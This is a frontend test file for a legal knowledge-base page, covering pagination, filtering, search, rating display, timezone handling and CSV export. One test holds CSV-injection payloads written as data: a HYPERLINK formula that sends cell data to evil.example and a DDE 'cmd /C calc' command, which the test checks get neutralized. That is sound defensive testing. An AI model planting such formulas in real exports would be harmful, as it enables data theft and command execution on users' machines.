// KnowledgeBasePage — accepted-assertion catalog + global search results.
// The api client and session are mocked; all data comes from fixtures.

import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

import type { AssertionList, AssertionListItem, AssertionListParams } from "../../api/types";
import { KnowledgeBasePage } from "../KnowledgeBasePage";

vi.mock("../../api/client", () => ({
  api: {
    listAssertions: vi.fn(),
    ratingSummary: vi.fn(),
  },
}));

// Viewer role on purpose: this page is read-only for every role, so it must
// render fully (and show no review/rating actions) even for a viewer.
const sessionFixture = {
  user: { id: "u1", email: "dana@example.com", display_name: "Dana Levi" },
  currentMatter: {
    id: "m1",
    name: "Acme v. Beta Holdings",
    repository_id: "r1",
    organization_id: "o1",
    role: "viewer" as const,
  },
  role: "viewer" as const,
  matters: [],
};

vi.mock("../../app/session", () => ({
  useActiveSession: () => sessionFixture,
}));

import { api } from "../../api/client";

const mockedApi = api as unknown as {
  listAssertions: ReturnType<typeof vi.fn>;
  ratingSummary: ReturnType<typeof vi.fn>;
};

const a1: AssertionListItem = {
  id: "a1",
  organization_id: "o1",
  repository_id: "r1",
  matter_id: "m1",
  assertion_type: "obligation",
  proposition: "Clause 8.2 requires notice to the supplier within 30 days.",
  proposition_raw: null,
  subject_entity: { type: "clause", id: "c-8.2" },
  object_entity: null,
  origin: "user_suggested",
  status: "accepted",
  standing: "accepted",
  author_user_id: "u2",
  confidence: null,
  jurisdiction: "IL",
  effective_from: null,
  effective_to: null,
  created_at: "2026-07-01T10:00:00Z",
  updated_at: "2026-07-20T10:00:00Z",
  submitted_at: "2026-07-02T10:00:00Z",
  reviewed_by: "u3",
  reviewed_at: "2026-07-03T10:00:00Z",
  superseded_by_assertion_id: null,
  current_revision_number: 3,
  evidence_status: "evidenced",
  // GET /assertions embeds the current revision's rating aggregate.
  ratings_summary: {
    assertion_id: "a1",
    assertion_revision_id: "rev-3",
    count: 12,
    average: 3.8,
    median: 4,
    distribution: { "1": 1, "2": 1, "3": 2, "4": 5, "5": 3 },
  },
  current_user_rating: null,
  last_activity_at: "2026-07-21T10:00:00Z",
};

const a2: AssertionListItem = {
  ...a1,
  id: "a2",
  proposition: "Termination for convenience requires 60 days written notice.",
  origin: "model_suggested",
  author_user_id: "u4",
  confidence: 0.82,
  jurisdiction: null,
  current_revision_number: null,
  evidence_status: "awaiting_evidence",
  ratings_summary: null,
};

/** A stand-in for GET /assertions over `rows`, honouring limit and offset. */
function serve(rows: AssertionListItem[]) {
  return async (_matterId: string, params: AssertionListParams = {}): Promise<AssertionList> => {
    const offset = params.offset ?? 0;
    const end = params.limit === undefined ? rows.length : offset + params.limit;
    return { items: rows.slice(offset, end), total: rows.length, limit: params.limit ?? null, offset };
  };
}

function manyRows(count: number): AssertionListItem[] {
  return Array.from({ length: count }, (_, i) => ({
    ...a1,
    id: `row-${i}`,
    proposition: `Proposition number ${i}.`,
  }));
}

/** Set the hash and let its (asynchronous) hashchange fire before anything
 * renders: in the app a page mounts in response to that event, never before. */
async function setHash(hash: string): Promise<void> {
  const target = hash === "" || hash === "#" ? "" : hash.startsWith("#") ? hash : `#${hash}`;
  if (window.location.hash === target) return;
  await new Promise<void>((resolve) => {
    window.addEventListener("hashchange", () => resolve(), { once: true });
    window.location.hash = hash;
  });
}

beforeEach(async () => {
  await setHash("");
  mockedApi.listAssertions.mockReset();
  mockedApi.ratingSummary.mockReset();
  mockedApi.listAssertions.mockImplementation(serve([a1, a2]));
});

describe("KnowledgeBasePage", () => {
  it("loads the first page of accepted assertions by default and renders the table", async () => {
    render(<KnowledgeBasePage />);

    expect(await screen.findByText(a1.proposition)).toBeInTheDocument();
    expect(mockedApi.listAssertions).toHaveBeenCalledWith("m1", {
      status: "accepted",
      sort: "-created_at",
      limit: 50,
      offset: 0,
    });

    // Matter name in the subtitle; propositions link to the detail page.
    expect(screen.getByText(/Acme v\. Beta Holdings/)).toBeInTheDocument();
    expect(screen.getByRole("link", { name: a1.proposition })).toHaveAttribute(
      "href",
      "#/assertions/a1",
    );

    // Origin chips, evidence status, and model confidence stay separate
    // signals. Scoped to the table: the filter selects reuse these labels.
    const table = within(screen.getByRole("table"));
    expect(table.getByText("Colleague")).toBeInTheDocument();
    expect(table.getByText("AI-deduced")).toBeInTheDocument();
    expect(table.getByText("Evidenced")).toBeInTheDocument();
    expect(table.getByText("Awaiting evidence")).toBeInTheDocument();
    expect(table.getByText(/82% model confidence/)).toBeInTheDocument();

    expect(screen.getByText("Showing 1–2 of 2 assertions")).toBeInTheDocument();
    // One page holds everything: no pager.
    expect(screen.queryByRole("button", { name: "Next" })).not.toBeInTheDocument();

    // Read-only page: no review or rating actions for any role (viewer here).
    expect(
      screen.queryByRole("button", { name: /accept|reject|dispute|revision|rate/i }),
    ).not.toBeInTheDocument();
  });

  it("labels pipeline output without evidence as system-derived, not awaiting evidence", async () => {
    // ui:4: the definition-linking pipeline writes accepted assertions with no
    // evidence rows; nothing is pending for them.
    const pipeline: AssertionListItem = {
      ...a2,
      id: "a3",
      proposition: "Section 4 uses the defined term 'Supplier'.",
      origin: "system_generated",
    };
    mockedApi.listAssertions.mockImplementation(serve([pipeline, a2]));
    render(<KnowledgeBasePage />);

    const row = (await screen.findByText(pipeline.proposition)).closest("tr") as HTMLElement;
    expect(within(row).getByText("System-derived")).toBeInTheDocument();
    expect(within(row).queryByText("Awaiting evidence")).not.toBeInTheDocument();
    // A colleague's or model's assertion without evidence still awaits it.
    const other = screen.getByText(a2.proposition).closest("tr") as HTMLElement;
    expect(within(other).getByText("Awaiting evidence")).toBeInTheDocument();
  });

  it("renders the rating summary embedded in each row, with no request per row", async () => {
    render(<KnowledgeBasePage />);

    expect(await screen.findByText("avg 3.8 · 12 ratings")).toBeInTheDocument();
    // ui:1: one rating-summary request per row exhausted the browser at
    // matter scale (2,036 rows: 680 failed requests, every cell "—").
    expect(mockedApi.ratingSummary).not.toHaveBeenCalled();
    expect(mockedApi.listAssertions).toHaveBeenCalledTimes(1);

    // a2 has no rating aggregate (unrated, or no revision row).
    const row2 = screen.getByText(a2.proposition).closest("tr");
    expect(row2).not.toBeNull();
    expect(within(row2 as HTMLElement).getByText("—")).toBeInTheDocument();

    // Legend keeps ratings distinct from review status and confidence.
    expect(
      screen.getByText(/independent of review status and model confidence/i),
    ).toBeInTheDocument();
  });

  it("shows at most one page of a large matter, from one request", async () => {
    // A definition-link run writes tens of thousands of accepted assertions.
    mockedApi.listAssertions.mockImplementation(serve(manyRows(20_000)));
    render(<KnowledgeBasePage />);

    await screen.findByText("Proposition number 0.");
    const table = within(screen.getByRole("table"));
    expect(table.getAllByRole("row")).toHaveLength(51); // header + 50
    expect(screen.getByText("Showing 1–50 of 20,000 assertions")).toBeInTheDocument();
    expect(screen.getByText("Page 1 of 400")).toBeInTheDocument();
    expect(mockedApi.listAssertions).toHaveBeenCalledTimes(1);
    expect(mockedApi.ratingSummary).not.toHaveBeenCalled();
  });

  it("pages with Previous and Next", async () => {
    mockedApi.listAssertions.mockImplementation(serve(manyRows(120)));
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);

    await screen.findByText("Proposition number 0.");
    expect(screen.getByText("Showing 1–50 of 120 assertions")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Previous" })).toBeDisabled();

    await user.click(screen.getByRole("button", { name: "Next" }));
    expect(await screen.findByText("Proposition number 50.")).toBeInTheDocument();
    expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
      status: "accepted",
      sort: "-created_at",
      limit: 50,
      offset: 50,
    });
    expect(screen.queryByText("Proposition number 0.")).not.toBeInTheDocument();
    expect(screen.getByText("Showing 51–100 of 120 assertions")).toBeInTheDocument();

    await user.click(screen.getByRole("button", { name: "Next" }));
    expect(await screen.findByText("Proposition number 119.")).toBeInTheDocument();
    expect(screen.getByText("Showing 101–120 of 120 assertions")).toBeInTheDocument();
    expect(screen.getByText("Page 3 of 3")).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Next" })).toBeDisabled();

    await user.click(screen.getByRole("button", { name: "Previous" }));
    expect(await screen.findByText("Proposition number 50.")).toBeInTheDocument();
    expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
      "m1",
      expect.objectContaining({ offset: 50 }),
    );
  });

  it("returns to the first page whenever the search, a filter or the sort changes", async () => {
    mockedApi.listAssertions.mockImplementation(serve(manyRows(120)));
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Proposition number 0.");

    const toPage2 = async () => {
      await user.click(screen.getByRole("button", { name: "Next" }));
      await screen.findByText("Proposition number 50.");
    };
    const lastOffset = () => mockedApi.listAssertions.mock.lastCall?.[1].offset;

    await toPage2();
    await user.selectOptions(screen.getByLabelText("Status"), "");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        sort: "-created_at",
        limit: 50,
        offset: 0,
      }),
    );
    await screen.findByText("Proposition number 0.");

    await toPage2();
    await user.selectOptions(screen.getByLabelText("Origin"), "model_suggested");
    await waitFor(() => expect(lastOffset()).toBe(0));
    await screen.findByText("Proposition number 0.");

    await toPage2();
    await user.selectOptions(screen.getByLabelText("Sort"), "proposition");
    await waitFor(() => expect(lastOffset()).toBe(0));
    await screen.findByText("Proposition number 0.");

    await toPage2();
    await user.type(screen.getByLabelText("Search assertions"), "number");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
        "m1",
        expect.objectContaining({ q: "number", offset: 0 }),
      ),
    );
    // Every request stayed one bounded page.
    for (const [, params] of mockedApi.listAssertions.mock.calls) {
      expect(params.limit).toBe(50);
    }
  });

  it("starts at the first page when a filter returns to an earlier value", async () => {
    mockedApi.listAssertions.mockImplementation(serve(manyRows(120)));
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Proposition number 0.");
    await user.click(screen.getByRole("button", { name: "Next" }));
    await screen.findByText("Proposition number 50.");

    await user.selectOptions(screen.getByLabelText("Origin"), "model_suggested");
    await screen.findByText("Proposition number 0.");
    await user.selectOptions(screen.getByLabelText("Origin"), "");

    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        status: "accepted",
        sort: "-created_at",
        limit: 50,
        offset: 0,
      }),
    );
    expect(screen.getByText("Showing 1–50 of 120 assertions")).toBeInTheDocument();
  });

  it("steps back to the last page when rows disappear from under it", async () => {
    let rows = manyRows(120);
    mockedApi.listAssertions.mockImplementation((m: string, p: AssertionListParams) =>
      serve(rows)(m, p),
    );
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Proposition number 0.");
    await user.click(screen.getByRole("button", { name: "Next" }));
    await screen.findByText("Proposition number 50.");

    // 30 rows leave the result set (reviewed elsewhere) before Next: page 3
    // no longer exists, so the page shows the last one that does.
    rows = manyRows(90);
    await user.click(screen.getByRole("button", { name: "Next" }));
    await waitFor(() =>
      expect(screen.getByText("Showing 51–90 of 90 assertions")).toBeInTheDocument(),
    );
    expect(screen.getByText("Proposition number 89.")).toBeInTheDocument();
    const offsets = mockedApi.listAssertions.mock.calls.map(([, params]) => params.offset);
    expect(offsets).toEqual([0, 50, 100, 50]);
    expect(screen.queryByText("No assertions found")).not.toBeInTheDocument();
  });

  it("refetches when status, origin, or sort change", async () => {
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText(a1.proposition);

    await user.selectOptions(screen.getByLabelText("Status"), "");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        sort: "-created_at",
        limit: 50,
        offset: 0,
      }),
    );

    await user.selectOptions(screen.getByLabelText("Origin"), "model_suggested");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        origin: "model_suggested",
        sort: "-created_at",
        limit: 50,
        offset: 0,
      }),
    );

    await user.selectOptions(screen.getByLabelText("Sort"), "proposition");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        origin: "model_suggested",
        sort: "proposition",
        limit: 50,
        offset: 0,
      }),
    );
  });

  it("sorts by ratings on the server and says that order is user opinion", async () => {
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText(a1.proposition);
    expect(screen.queryByText(/user opinion/)).not.toBeInTheDocument();

    await user.selectOptions(screen.getByLabelText("Sort"), "-average_rating");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
        "m1",
        expect.objectContaining({ sort: "-average_rating", offset: 0 }),
      ),
    );
    // Spec §17: sorting by rating reflects user opinion, not legal authority.
    expect(screen.getByText(/user opinion, not legal authority/)).toBeInTheDocument();

    await user.selectOptions(screen.getByLabelText("Sort"), "-rating_count");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
        "m1",
        expect.objectContaining({ sort: "-rating_count" }),
      ),
    );
    expect(screen.getByText(/user opinion, not legal authority/)).toBeInTheDocument();
  });

  it("searches with a debounced q param", async () => {
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText(a1.proposition);

    await user.type(screen.getByLabelText("Search assertions"), "notice");

    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith(
        "m1",
        expect.objectContaining({ q: "notice" }),
      ),
    );
  });

  it("reads ?q= from the hash as a search across every status", async () => {
    // ?q= is the topbar's global search (ui:22): it must find assertions in
    // any status the viewer can see, not only the accepted catalog.
    await setHash("#/knowledge?q=capacity");
    const view = render(<KnowledgeBasePage />);

    await screen.findByText(a1.proposition);
    expect(mockedApi.listAssertions).toHaveBeenCalledWith("m1", {
      q: "capacity",
      sort: "-created_at",
      limit: 50,
      offset: 0,
    });
    // One request: the search does not first load the accepted catalog.
    expect(mockedApi.listAssertions).toHaveBeenCalledTimes(1);
    expect(screen.getByLabelText("Status")).toHaveValue("");
    expect(screen.getByText(/Results for/)).toHaveTextContent(
      "Results for “capacity” across all statuses",
    );
    expect(screen.getByText("“capacity”")).toBeInTheDocument();
    expect(screen.getByLabelText("Search assertions")).toHaveValue("capacity");

    // The line says what is searched when a status filter narrows it.
    const user = userEvent.setup();
    await user.selectOptions(screen.getByLabelText("Status"), "accepted");
    expect(screen.getByText(/Results for/)).toHaveTextContent(
      "Results for “capacity” in Accepted",
    );

    view.unmount();
    await setHash("");
  });

  it("offers every review status in the Status filter", async () => {
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText(a1.proposition);

    const options = within(screen.getByLabelText("Status"))
      .getAllByRole("option")
      .map((option) => (option as HTMLOptionElement).value);
    expect([...options].sort()).toEqual(
      [
        "",
        "accepted",
        "disputed",
        "draft",
        "proposed",
        "rejected",
        "revision_requested",
        "superseded",
        "withdrawn",
      ].sort(),
    );

    await user.selectOptions(screen.getByLabelText("Status"), "revision_requested");
    await waitFor(() =>
      expect(mockedApi.listAssertions).toHaveBeenLastCalledWith("m1", {
        status: "revision_requested",
        sort: "-created_at",
        limit: 50,
        offset: 0,
      }),
    );
  });

  it("shows an empty state when nothing matches", async () => {
    mockedApi.listAssertions.mockImplementation(serve([]));
    render(<KnowledgeBasePage />);

    expect(await screen.findByText("No assertions found")).toBeInTheDocument();
    expect(screen.queryByRole("table")).not.toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Export CSV" })).toBeDisabled();
  });

  it("shows an error banner and retries on demand", async () => {
    mockedApi.listAssertions
      .mockRejectedValueOnce(new Error("Matter unavailable"))
      .mockResolvedValueOnce({ items: [a1], total: 1 });
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);

    expect(await screen.findByRole("alert")).toHaveTextContent("Matter unavailable");

    await user.click(screen.getByRole("button", { name: "Retry" }));
    expect(await screen.findByText(a1.proposition)).toBeInTheDocument();
    expect(mockedApi.listAssertions).toHaveBeenCalledTimes(2);
  });

  it("exports every match as CSV, paging through the list 500 rows at a time", async () => {
    // More than one export page, and more than the 50 rows on screen.
    const rows = [...manyRows(1_202), a2];
    mockedApi.listAssertions.mockImplementation(serve(rows));

    const { text, revokeObjectURL } = await exportCsv("Proposition number 0.");

    const lines = text.split("\r\n");
    expect(lines[0]).toBe(
      "Proposition,Type,Jurisdiction,Origin,Status,Standing,Evidence,Avg rating,Ratings,Updated",
    );
    expect(lines).toHaveLength(1 + rows.length);
    expect(lines[1]).toBe(
      "Proposition number 0.,obligation,IL,Colleague,accepted,accepted,evidenced,3.80,12,2026-07-20T10:00:00.000Z",
    );
    expect(text).toContain("\r\nProposition number 1201.,");
    // A row without a rating aggregate: no average, zero ratings.
    expect(lines[lines.length - 1]).toBe(
      `${a2.proposition},obligation,,AI-deduced,accepted,accepted,awaiting_evidence,,0,2026-07-20T10:00:00.000Z`,
    );
    // The export used the page's filters and sort, 500 rows per request.
    const exportCalls = mockedApi.listAssertions.mock.calls
      .map(([, params]) => params as AssertionListParams)
      .filter((params) => params.limit === 500);
    expect(exportCalls).toEqual([
      { status: "accepted", sort: "-created_at", limit: 500, offset: 0 },
      { status: "accepted", sort: "-created_at", limit: 500, offset: 500 },
      { status: "accepted", sort: "-created_at", limit: 500, offset: 1000 },
    ]);
    expect(mockedApi.ratingSummary).not.toHaveBeenCalled();
    expect(revokeObjectURL).toHaveBeenCalledWith("blob:lexgraph");
  });

  it("shows export progress and can cancel it", async () => {
    let releaseSecondPage: () => void = () => {};
    const rows = manyRows(700);
    mockedApi.listAssertions.mockImplementation(
      async (m: string, params: AssertionListParams = {}) => {
        if (params.limit === 500 && params.offset === 500) {
          await new Promise<void>((resolve) => {
            releaseSecondPage = resolve;
          });
        }
        return serve(rows)(m, params);
      },
    );
    const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
    Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Proposition number 0.");

    await user.click(screen.getByRole("button", { name: "Export CSV" }));
    expect(await screen.findByRole("status")).toHaveTextContent("Exporting 500 of 700");
    expect(screen.getByRole("button", { name: "Export CSV" })).toBeDisabled();

    await user.click(screen.getByRole("button", { name: "Cancel export" }));
    releaseSecondPage();
    await waitFor(() =>
      expect(screen.getByRole("button", { name: "Export CSV" })).toBeEnabled(),
    );
    expect(screen.queryByRole("status")).not.toBeInTheDocument();
    expect(createObjectURL).not.toHaveBeenCalled();
  });

  it("reports a failed export instead of downloading part of it", async () => {
    const rows = manyRows(700);
    mockedApi.listAssertions.mockImplementation(
      async (m: string, params: AssertionListParams = {}) => {
        if (params.limit === 500 && params.offset === 500) throw new Error("Server went away");
        return serve(rows)(m, params);
      },
    );
    const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
    Object.assign(URL, { createObjectURL, revokeObjectURL: vi.fn() });
    const user = userEvent.setup();
    render(<KnowledgeBasePage />);
    await screen.findByText("Proposition number 0.");

    await user.click(screen.getByRole("button", { name: "Export CSV" }));

    expect(await screen.findByRole("alert")).toHaveTextContent(
      "CSV export failed: Server went away",
    );
    expect(createObjectURL).not.toHaveBeenCalled();
    expect(screen.getByRole("button", { name: "Export CSV" })).toBeEnabled();
  });

  it("neutralizes cells a spreadsheet would evaluate as formulas (CSV injection)", async () => {
    // Contributors write propositions freely (the API accepts all of these),
    // so an exported cell must never start with a formula trigger.
    const propositions = [
      '=HYPERLINK("http://evil.example/?x="&A2,"click me")',
      "+1+cmd|' /C calc'!A0",
      "-2+3",
      "@SUM(1,2)",
      "\tleading tab",
      "\rleading carriage return",
      " =1+1",
    ];
    mockedApi.listAssertions.mockImplementation(
      serve([...propositions.map((proposition, i) => ({ ...a1, id: `f${i}`, proposition })), a2]),
    );
    const { text } = await exportCsv(a2.proposition);

    expect(text).toContain(`\r\n"'=HYPERLINK(""http://evil.example/?x=""&A2,""click me"")",`);
    expect(text).toContain("\r\n'+1+cmd|' /C calc'!A0,");
    expect(text).toContain("\r\n'-2+3,");
    expect(text).toContain(`\r\n"'@SUM(1,2)",`);
    expect(text).toContain("\r\n'\tleading tab,");
    expect(text).toContain(`\r\n"'\rleading carriage return",`);
    expect(text).toContain("\r\n' =1+1,");
    // Ordinary text is exported unchanged.
    expect(text).toContain(`\r\n${a2.proposition},`);
    for (const line of text.split("\r\n").slice(1)) {
      expect(line).not.toMatch(/^"?[=+\-@\t]/);
    }
  });
});

describe("KnowledgeBasePage in Asia/Tokyo", () => {
  // ui:3: an offset-less timestamp is UTC. Read as local time it showed
  // the UTC date and time as the viewer's (here a day early).
  beforeAll(() => {
    vi.stubEnv("TZ", "Asia/Tokyo");
  });
  afterAll(() => {
    vi.unstubAllEnvs();
  });

  it("shows the viewer's local date for an offset-less instant and exports it as UTC", async () => {
    mockedApi.listAssertions.mockImplementation(
      serve([{ ...a1, updated_at: "2026-11-15T20:16:17.835814" }]),
    );
    const { text } = await exportCsv(a1.proposition);

    const row = screen.getByText(a1.proposition).closest("tr");
    expect(row).not.toBeNull();
    // 20:16 UTC on Nov 15 is 05:16 on Nov 16 in Tokyo.
    expect(within(row as HTMLElement).getByText("Nov 16, 2026")).toBeInTheDocument();
    expect(text.split("\r\n")[1]).toMatch(/,2026-11-15T20:16:17\.835Z$/);
  });
});

/** Render, wait for `readyText`, click Export CSV and return the downloaded file's text. */
async function exportCsv(readyText: string) {
  const user = userEvent.setup();
  const createObjectURL = vi.fn((_blob: Blob) => "blob:lexgraph");
  const revokeObjectURL = vi.fn();
  Object.assign(URL, { createObjectURL, revokeObjectURL });
  const click = vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
  try {
    render(<KnowledgeBasePage />);
    await screen.findByText(readyText);
    await user.click(screen.getByRole("button", { name: "Export CSV" }));
    await waitFor(() => expect(click).toHaveBeenCalledTimes(1));
    expect(createObjectURL).toHaveBeenCalledTimes(1);
    const blob = createObjectURL.mock.calls[0][0];
    // jsdom's Blob has no .text(); go through FileReader instead.
    const text = await new Promise<string>((resolve, reject) => {
      const reader = new FileReader();
      reader.onload = () => resolve(reader.result as string);
      reader.onerror = () => reject(reader.error);
      reader.readAsText(blob);
    });
    return { text, revokeObjectURL };
  } finally {
    click.mockRestore();
  }
}
